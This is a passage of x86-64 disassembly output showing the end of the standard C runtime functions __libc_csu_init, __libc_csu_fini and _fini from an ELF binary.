 dc1:	48 39 dd             	cmp    %rbx,%rbp
 dc4:	75 ea                	jne    db0 <__libc_csu_init+0x40>
 dc6:	48 83 c4 08          	add    $0x8,%rsp
 dca:	5b                   	pop    %rbx
 dcb:	5d                   	pop    %rbp
 dcc:	41 5c                	pop    %r12
 dce:	41 5d                	pop    %r13
 dd0:	41 5e                	pop    %r14
 dd2:	41 5f                	pop    %r15
 dd4:	c3                   	retq   
 dd5:	90                   	nop
 dd6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 ddd:	00 00 00 

0000000000000de0 <__libc_csu_fini>:
 de0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000de4 <_fini>:
 de4:	48 83 ec 08          	sub    $0x8,%rsp
 de8:	48 83 c4 08          	add    $0x8,%rsp
 dec:	c3                   	retq   
